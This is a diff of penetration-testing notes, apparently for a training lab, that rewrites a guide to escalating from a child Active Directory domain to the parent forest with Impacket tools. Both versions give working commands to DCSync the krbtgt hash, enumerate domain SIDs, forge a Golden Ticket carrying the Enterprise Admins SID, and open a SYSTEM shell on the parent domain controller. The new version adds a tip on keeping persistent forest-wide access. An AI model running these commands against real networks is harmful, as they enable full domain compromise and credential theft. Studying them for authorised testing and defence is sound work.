@@ -1,115 +1,73 @@
-## Methodology
+# Attacking Domain Trusts — Child → Parent (Linux)
 
-1. **Verify Child Domain Admin**
-    - Confirm complete control of the child domain (e.g., `LOGISTICS.INLANEFREIGHT.LOCAL`) to enable DCSync.
-2. **Select Escalation Path**
-    - **Manual**: Use for better control, troubleshooting, and avoiding "autopwn" detection in sensitive production environments.
-    - **Automated**: Use `raiseChild.py` for rapid escalation if manual precision is not a priority.
-3. **Information Gathering (Manual Path)**
-    - Execute DCSync to pull the `krbtgt` NTLM hash.
-    - Enumerate the Child Domain SID.
-    - Enumerate the Parent Domain SID and locate the Enterprise Admins RID (519).
-4. **Ticket Forgery and Injection**
-    - Generate a Golden Ticket including the Parent Enterprise Admins SID in the `ExtraSids` array.
-    - Load the ticket into the current session via environment variables.
-5. **Execution**
-    - Authenticate to the Parent Domain Controller to receive a SYSTEM shell.
+Same attack, same data requirements — Linux tooling instead of Mimikatz/Rubeus.
 
 ---
 
-## DCSync Child Domain Credentials
+## Gather Required Data
 
-When you have administrative control over the child domain and need the `krbtgt` NTLM hash for ticket forgery.
+DCSync child domain `krbtgt`:
 
-DCSync the `krbtgt` account using secretsdump
-
-```
-secretsdump.py <DOMAIN>/<USERNAME>@<DC_IP> -just-dc-user <DOMAIN>/krbtgt
+```bash
+secretsdump.py <CHILD_DOMAIN>/<USER>@<CHILD_DC_IP> -just-dc-user <CHILD_DOMAIN>/krbtgt
 ```
 
-**Gotchas**
+Get child domain SID:
 
-- **Insufficient privileges** will prevent the DRSUAPI method from dumping secrets.
-
-## Enumerate Domain SIDs
-
-When identifying the unique SIDs for both child and parent domains to construct the PAC `ExtraSids` array.
-
-Perform SID brute forcing against the child DC
-
-```
-lookupsid.py <DOMAIN>/<USERNAME>@<DC_IP> | grep "Domain SID"
+```bash
+lookupsid.py <CHILD_DOMAIN>/<USER>@<CHILD_DC_IP> | grep "Domain SID"
 ```
 
-Identify the Parent Domain SID and Enterprise Admins RID by targeting the forest root DC
+Get parent domain SID + confirm Enterprise Admins RID (always 519):
 
-```
-lookupsid.py <DOMAIN>/<USERNAME>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
-```
-
-**Gotchas**
-
-- **Targeting the wrong DC** provides the local domain SID instead of the required parent/forest SID.
-
-## Forge Golden Ticket with SID History
-
-When you have the child `krbtgt` hash, the child domain SID, and the parent domain SID with the Enterprise Admins RID (519).
-
-Construct the cross-domain Golden Ticket
-
-```
-ticketer.py -nthash <HASH> -domain <DOMAIN> -domain-sid <CHILD_SID> -extra-sid <PARENT_SID>-519 <USERNAME>
+```bash
+lookupsid.py <CHILD_DOMAIN>/<USER>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins"
 ```
 
-**Gotchas**
+EA SID = parent domain SID + `-519`
 
-- **Malformed SID strings** in the `-extra-sid` flag will cause authentication failure during the cross-domain request.
+---
 
-## Execute Remote Shell on Parent DC
+## Forge Golden Ticket with ticketer.py
 
-When the `.ccache` file is generated and you need to pivot to the Parent DC.
-
-Inject the forged ticket into the session
-
-```
-export KRB5CCNAME=<FILE_PATH>
+```bash
+ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_FQDN> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> <FAKEUSER>
 ```
 
-Execute a SYSTEM shell on the Parent DC via Kerberos
+Output: `<FAKEUSER>.ccache`
 
-```
-psexec.py <DOMAIN>/<USERNAME>@<DC_FQDN> -k -no-pass -target-ip <TARGET_IP>
-```
+Set it as the active credential cache:
 
-> ⚠️ Gap: Kerberos authentication typically requires valid DNS resolution for the `<DC_FQDN>` in `/etc/hosts` or `/etc/resolv.conf`; providing only the IP via `-target-ip` may still fail if the SPN cannot be validated.
-
-**Gotchas**
-
-- **Clock desynchronization** between the attack host and the DC will invalidate Kerberos tickets.
-
-## Automated Child-to-Parent Escalation
-
-When administrative credentials for the child domain are available and rapid escalation is preferred over manual steps.
-
-Automate the full escalation process including a PSExec shell
-
-```
-raiseChild.py -target-exec <PARENT_DC_IP> <DOMAIN>/<USERNAME>
+```bash
+export KRB5CCNAME=<FAKEUSER>.ccache
 ```
 
-### Tool Comparison
+---
 
-- **raiseChild.py**
-    - `raiseChild.py -target-exec <TARGET_IP> <DOMAIN>/<USERNAME>`
-    - Prefer for speed; automates SID discovery, `krbtgt` dumping, and ticket forgery.
-- **Manual (ticketer/psexec)**
-    - Standard Impacket workflow.
-    - Prefer for stealth and troubleshooting when automated scripts fail or are blocked.
+## Use the Ticket
 
-**Dangerous / misconfigured settings**
+SYSTEM shell on parent DC via psexec:
 
-- Using "autopwn" scripts in production environments can lead to unpredictable breakage or high-visibility alerts.
+```bash
+psexec.py <CHILD_FQDN>/<FAKEUSER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>
+```
 
-**Gotchas**
+DCSync a specific user in the parent domain:
 
-- **Script failure** leaves the operator without context on which specific stage (DCSync, SID lookup, or Ticket Forgery) failed.
+```bash
+secretsdump.py -just-dc-user <PARENT_DOMAIN>/administrator -k -no-pass <PARENT_DC_FQDN>
+```
+
+---
+
+## Automated — raiseChild.py
+
+Does all of the above in one command: grabs EA SID, DCsyncs child `krbtgt`, forges ticket, dumps parent admin creds, drops into psexec shell:
+
+```bash
+raiseChild.py -target-exec <PARENT_DC_IP> <CHILD_FQDN>/<CHILD_ADMIN>
+```
+
+> [!warning] `raiseChild.py` is an autopwn script — if it breaks something in production you won't know why. Understand the manual steps first, use this only if time-boxed and you've already verified the manual path works.
+
+> [!tip] After getting parent domain access, DCSync `krbtgt` of the parent → Golden Ticket for the forest root = persistent forest-wide access. Always do this before cleanup.
